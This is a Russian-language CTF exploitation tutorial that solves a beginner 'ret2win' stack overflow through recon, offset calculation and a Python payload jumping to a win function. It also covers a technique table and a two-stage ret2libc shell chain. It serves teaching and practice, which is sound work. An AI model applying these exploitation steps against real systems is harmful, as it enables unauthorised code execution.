## Вопрос, с которого всё начинается

На CTF время ограничено. Ты открываешь задачу и не хочешь изобретать заново то, что решается по шаблону. Вопрос звучит так: **как по внешним признакам быстро выбрать рабочую технику?** В этом уроке мы возьмём один конкретный бинарник, пройдём весь путь от «файл на руках» до «shell» и выведем из этого **рецепт**: какие сигнатуры указывают на какую технику.

## Наш пример

У нас файл `ret2win` — типичная beginner-задача. Начинаем с разведки:

```
$ file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, not stripped
```

```
$ checksec --file=ret2win
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

Уже это определяет стратегию: **канарейки нет** (можно переполнять стек), **NX включён** (шеллкод на стеке не запустить), **PIE нет** (адреса фиксированы), **not stripped** (есть имена функций).

## Шаг 1: ищем цель

Раз есть имена, ищем подозрительную функцию:

```
$ nm ret2win | grep -iE 'win|flag|main'
0000000000401146 T win
0000000000401147 T main
```

Есть `win` — почти всегда именно она цель. Дизассемблируем её:

```
$ objdump -d -M intel ret2win | sed -n '/<win>:/,/^$/p'
0000000000401146 <win>:
  401146: push   rbp
  401147: mov    rbp,rsp
  40114a: mov    edi,0x402004      ; адрес строки
  40114f: call   401030 <puts@plt>
```

`win` печатает строку (в реальной задаче — флаг или `system("/bin/sh")`). Значит, цель — **прыгнуть в `win`**.

## Шаг 2: ищем баг

Смотрим `main`:

```
$ objdump -d -M intel ret2win | sed -n '/<main>:/,/^$/p'
0000000000401157 <main>:
  401157: push   rbp
  401158: mov    rbp,rsp
  40115b: sub    rsp,0x40
  40115f: lea    rax,[rbp-0x40]
  401163: mov    rdi,rax
  401166: call   401040 <gets@plt>     ; <-- баг!
```

`gets` — классическое переполнение стека: он читает строку без ограничения длины в буфер на 64 байта (`sub rsp,0x40`).

## Шаг 3: считаем смещение

Буфер `buf` начинается по `rbp-0x40` (64 байта). Дальше идут сохранённый `rbp` (8 байт) и адрес возврата (8 байт). Значит:

```
смещение до адреса возврата = 64 (буфер) + 8 (saved rbp) = 72
```

Проверить можно в отладчике: подать `A`*72 + `BBBBBBBB` и убедиться, что `rip = 0x4242424242424242`.

## Шаг 4: собираем payload

Кладём 72 байта, затем адрес возврата. Учитываем **выравнивание стека**: перед `win` поставим лишний `ret`-гаджет, чтобы `call` внутри `win` не упал на `movaps`.

```python
from struct import pack
payload  = b'A' * 72
payload += pack('<Q', 0x40101a)   # ret (выравнивание)
payload += pack('<Q', 0x401146)   # win
```

Запускаем:

```
$ ./ret2win < payload
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
WIN: control of RIP -> win()
```

**Сработало.** Управление ушло в `win`. Это и есть рецепт ret2win: `checksec` → `nm` → `objdump` → смещение → payload.

## Шаг 5: таблица рецептов

Вот сводка «сигнатура → техника», которую стоит держать в голове:

- **NX off** → шеллкод на стеке (просто прыгнуть на буфер).
- **NX on, есть `win`/`system`, PIE off** → **ret2win** / **ret2libc** (как в нашем примере).
- **NX on, PIE on, есть утечка** → **ret2libc** с вычислением базы libc.
- **Canary on** → нужна утечка/брутфорс канарейки, затем ret2win/ret2libc.
- **Full RELRO** → GOT перезаписывать нельзя; цели — `__free_hook`/`__malloc_hook` (старые glibc) или структуры FILE.
- **Format string в вводе** → произвольное чтение/запись через `%n`.
- **Много malloc/free** → heap-техники (UAF, tcache poisoning).
- **Нестандартная архитектура** → те же рецепты, но с учётом регистров и endianness.

## Шаг 6: как тренироваться

Лучший способ закрепить рецепты — **повторение**. Возьми десяток beginner-задач и реши каждую по шагам разведки, проговаривая вслух, почему выбрана техника. Через несколько задач ты начнёшь «видеть» решение сразу после `checksec`.

Полезно вести **личный чек-лист**: что проверять (protections, функции, баг), что делать при каждой комбинации. Тогда на реальном CTF ты не тратишь время на метания.

## Шаг 7: разбираем задачу посложнее — ret2libc

Тот же подход работает и когда `win` нет. Представь: `checksec` показывает **NX on, PIE on**, символов `win`/`system` нет. Что делать?

1. **Найди утечку.** Ищи функцию, которая печатает адрес или содержимое памяти (`puts(buf)`, `%p`, `printf` с неправильным форматом). Без неё PIE не обойти.
2. **Найди смещение** до адреса возврата (как в нашем примере) и **offset** до контролируемого буфера.
3. **Утеки адрес** функции из libc: вернись в `puts@plt` с аргументом `got['puts']`. Вывод даст реальный адрес `puts`.
4. **Вычисли базу libc**: `base = leaked - puts_offset`. Смещение `puts` берётся из **той же libc**, что использует цель (иногда её дают в задаче).
5. **Собери вторую цепочку**: `pop rdi; ret` + адрес `/bin/sh` + `system`. Если программа после первой цепочки завершится — вернись в `main` (адрес из бинарника) и отправь вторую порцию.

Это стандартный «ret2libc в два захода»: первая цепочка — утечка, вторая — shell. Рецепт: **нет win → ищи утечку → считай базу libc → строй цепочку**.

Если ASLR выключен, шаги 3-4 пропускаются — адреса libc фиксированы.

## Шаг 8: как не терять время

Три привычки, которые ускоряют решение:

- **Сразу пиши скрипт** на pwntools (`from pwn import *`), а не дёргай программу руками. `ELF`-объект сам даёт `got`, `plt`, `symbols`.
- **Проверяй интерактивность.** Локально гоняй `process()`, на сервере — `remote()`; один и тот же скрипт.
- **Веди чек-лист.** Protections → символы → баг → примитив → эксплойт. Проговаривание вслух ловит пропущенные шаги.

Разведка не заканчивается на первом проходе: если техника не сработала, вернись и перечитай выводы — часто ответ уже был в `checksec` или `nm`.

И помни про **время**: на CTF не нужно идеальное решение — нужно работающее. Если ret2win собирается за 5 минут, не усложняй. Выбирай **простейшую** технику, которая проходит защиты. А если застрял — отложи задачу и вернись со свежим взглядом.

## Что мы теперь знаем

- Разведка задачи — это **`file` → `checksec` → `nm` → `objdump`**, и она сразу задаёт стратегию.
- Наш пример — классический **ret2win**: переполнение через `gets`, цель — функция `win`.
- **Смещение** считается по структуре кадра (буфер + saved rbp).
- **Выравнивание стека** может требовать лишний `ret`-гаджет.
- Существует **таблица рецептов** «сигнатура → техника», которая экономит время.
